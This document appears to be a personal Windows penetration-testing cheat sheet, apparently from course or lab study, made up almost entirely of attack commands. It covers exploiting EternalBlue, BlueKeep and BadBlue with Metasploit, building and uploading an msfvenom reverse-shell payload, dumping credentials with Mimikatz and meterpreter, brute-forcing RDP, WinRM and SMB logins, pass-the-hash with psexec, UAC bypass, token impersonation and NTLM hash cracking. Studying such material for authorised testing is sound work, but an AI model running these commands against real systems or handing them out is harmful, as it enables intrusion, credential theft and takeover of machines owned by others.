

**EternalBlue**

	**Nmap**
	-nmap -sV -p 445 --script=smb-vuln-ms17-010 ip (to find it eternalblue or not)

	**Metasploit**
	-exploit/windows/smb/ms17_010_eternalblue
	
	-To identifies:
		-Windows Vista
		-Windows 7
		-Windows Server 2008
		-Windows 8.1
		-Windows Server 2012
		-Windows 10
		-Windows Server 2016

**BlueKeep**

	**Metasploit**
	-search BlueKeep in metasploit
	-show targets, set target 2
	
	-identifies:
		-XP
		-Vista
		-Windows 7
		-Windows Server 2008 & R2
	
**badblue** 

	**Idenfifies**
	-port 80 BadBlue httpd 2.7

	**Metasploit**
	-exploit/windows/http/badblue_passthru
	-search badblue => use1
	
	**In meterpreter**
	-pgrep lsass => migrate 780 
	-getuid
	-load 
	-creds_all
	-lsa_dump_sam (show NTLM Hash)
	-hashdump

**Payload**

	**In Kali**
	-msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=<Your_IP> lport=1234 -f asp -o payload.asp

	**ftp**
	-put payload.asp

	**Metasploit**
	-use exploit/multi/handler  
	-set PAYLOAD windows/x64/meterpreter/reverse_tcp  
	-set LHOST <Your_IP>  
	-set LPORT 1234  
	-run
	
**Mimikatz**

	-mkdir Temp
	-cd Temp
	-upload /usr/share/windows-resources/mimikatz/x64/mimikatz.exe
	-.\mimikatz.exe
	-privilege:debug
	-lsadump::sam (show syskey, domain)
	-lsadump::secrets
	-sekursla::logonpasswords

**RDP**

	-identifies default port is 3389

	**Metasploit**
	-auxiliary/scanner/rdp/rdp_scanner

	**Brute-force**
	-hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt rdp://ip -s 3333 (if 3389 is not open)

	**Access to Window**
	-xfreerdp /u:administrator /p:qwertyuiop /v:ip:3333 (will openup the window machine)


**WinRM**

	-identifies: 5985, 5986

	**Brute-force**
	-crackmapexec winrm ip -u /usr/share/metasploit-framework/data/wordlists/common_users.txt -p /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt

	**Gain Access**
	-crackmapexec winrm ip -u administrator -p password -x "whoami" (-x "" like we use command in terminal)
	-evil-winrm.rb -u administrator -p 'password' -i ip (command shell session)
	-evil-winrm -i ip -U username -p password
	-exploit/windows/winrm/winrm_script_exec => set FORCE_VBS true (same above)

	**Metasploit**
	-auxiliary/scanner/winrm/winrm_login => set PASSWORD anything (brute-force)
	-auxiliary/scanner/winrm/winrm_auth_methods (Target supports two authentication types i.e Basic and Negotiate)
	-auxiliary/scanner/winrm/winrm_cmd => set CMD whoami (Execute command)
	-exploit/windows/winrm/winrm_script_exec (exploit the module to get the meterpreter shell)
	

**SMB**(port 445, NetBIOS 139)

	**Nmap**
	-nmap -p445 --script smb-protocols ip (to find all supported SMB version)
	-nmap -p445 --script smb-security-mode ip (to find security protocol level)
	-nmap -p445 --script smb-enum-users.nse ip (to find all present users)

	**Metasploit-framework**
	- auxiliary/scanner/smb/smb_version
	- auxiliary/scanner/smb/smb_enumusers 
	- auxiliary/scanner/smb/smb_enumshares (ShowFiles option -> true)
	- auxiliary/scanner/smb/smb_login (brute-force) (file same as FTP) => set CreateSession true (you will go to smb, commands use shares, shares -i sharefolder)
	- auxiliary/scanner/smb/pipe_auditor (list the named pipes available over SMB on the samba server)
	
	**Listing the sharefolder**
	- smbclient -L \ \ \ \ip\ \ -U users (-L: to list the share that we can access)
	- smbclient -L ip (same as above)
	- smbclient -L domain -N (same as above)
	- smbclient -L //domain -N
	- smbclient -L ip -U user
	- smbmap -H domain -u user -p password(show permission)
	
	**Login** 
	- smbclient \ \ \ \ ip\ \ folder -U users (to login)
	- smbclient //ip/folder -U '' (same as above)
	- smbclient //ip/share -U user%password
	- smbclient //ip/user -U user
	- smbclient //ip/Anonymous -N
	
	**Show Samba Server**
	- exploit/linux/samba/is_known_pipename
	- nmblookup -A domain or ip (Find the NetBIOS computer name of samba server)
	- rpcclient -U "" -N domain or ip
	- In rpcclient $>
		- netshareenum
		- netsharegetinfo public
		- srvinfo

**PsExec**

	**Access**
	-psexec.py Administrator@ip cmd.exe (to login after has user&password)
	-psexec.py user@ip (need user&password)
	-crackmapexec smb ip -u Administrator -H "hash"
	-crackmapexec smb ip -u Administrator -H "hash" -x "ipconfig"

	**Metasploit**
	-set target Command, Native\ upload
	-exploit/windows/smb/psexec (Code Execution) => set SMBUser => set SMBPass (hash) => set target Native\ upload
	-set payload windows/x64/meterpreter/reverse_tcp
	

**SNMP**(port 161, UDP port so use -sU)

	**Nmap**
	-nmap -sU -p 161 --script=snmp-brute ip
	-nmap -sU -p 161 --script snmp-* ip 

	-snmpwalk -v 1 -c (public/private/secret based on nmap result above) ip


**Bypassing UAC (HttpFileServers, port 80)**

	-net localgroup administrators
	-sysinfo
	-pgrep explorer
	-migrate value from pgrep
	-getprivs (getsystem)
	-exploit/windows/http/rehetto_hfs_exec
	

**Hash Cracking**

	-john --format=NT hashes.txt (crack NTLM hash)
	-hashcat -a3 -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt


**Configuration File**

	-C:\Windows\System32\config
	-C:\Windows\config
	-C:\Windows\System32\drivers\etc
	-C:\Windows\ProgramData

**Permission**

	-whoami /priv
	-icals flag(specific file)
	-icals flag /remove:d "NT AUTHORITY\SYSTEM"

**Pivoting**

![[Screenshot 2025-11-02 at 10.06.30 in the morning.png]]

![[Screenshot 2025-11-02 at 10.07.28 in the morning.png]]

![[Screenshot 2025-11-02 at 10.08.10 in the morning.png]]

![[Screenshot 2025-11-02 at 10.08.38 in the morning.png]]

![[Screenshot 2025-11-02 at 10.08.58 in the morning.png]]

![[Screenshot 2025-11-02 at 10.09.43 in the morning.png]]

![[Screenshot 2025-11-02 at 10.10.04 in the morning.png]]

![[Screenshot 2025-11-02 at 10.10.36 in the morning.png]]

**Privilege Escalation**

	**Metasploit**
	-post/multi/recon/local_exploit_suggester
	-exploit/windows/local/ms16_014_wmi_recv_notif
	-exploit/windows/http/rejetto_hfs_exec (port 80, HttpFileServer, hfs)
	-exploit/multi/script/web_delivery => set target PSH\ (Binary) => set payload windows/shell/reverse_tcp => set PSH-EncodedCommand false

	**In meterpreter**
	-getuid
	-load incognito
	-list_tokens -u
	-impersonate_token ATTACKDEFENSE\\Administrator

![[Screenshot 2025-11-01 at 3.49.36 in the afternoon.png]]


**PowerShell**

	**What you need to know**
	-PowerSploit: PowerSploit is a collection of Microsoft PowerShell modules that can be used to aid penetration testers during all phases of an assessment. 

	-PowerUp.ps1: PowerUp aims to be a clearing house of common Windows privilege escalation vectors that rely on misconfigurations.

	-Source: https://github.com/PowerShellMafia/PowerSploit

	**Gain access to meterpreter session with high privilege**

![[Screenshot 2025-11-01 at 9.29.57 at night 1.png]]
	
![[Screenshot 2025-11-01 at 9.31.45 at night.png]]![[Screenshot 2025-11-01 at 9.33.05 at night.png]]![[Screenshot 2025-11-01 at 9.33.58 at night 1.png]]![[Screenshot 2025-11-01 at 9.35.03 at night 3.png]]![[Screenshot 2025-11-01 at 9.36.02 at night 1.png]]

- `Import-Module .\PowerView.ps1`
    
- `Get-NetIP` — IP info
    
- `Get-NetComputer -FullData` — list machines
    
- `Get-NetUser` / `Get-NetUser -SPN` — users, service accounts
    
- `Get-NetGroup -GroupName "Domain Admins" -Verbose` — group membership
    
- `Get-NetShare` — network shares
    
- `Invoke-ShareFinder` — find writable shares

- getprivs (list what you can escalate to the admin) => get system

- `whoami /all` — privileges & groups
    
- `net user` / `net localgroup administrators` — local admin checks
    
- `wmic service get name,pathname,started` — check service paths (for unquoted path issues)
    
- `schtasks /query /fo LIST /v` — scheduled tasks
    
- `reg query "HKLM\SYSTEM\CurrentControlSet\Services" /s` — service config (for weak perms)


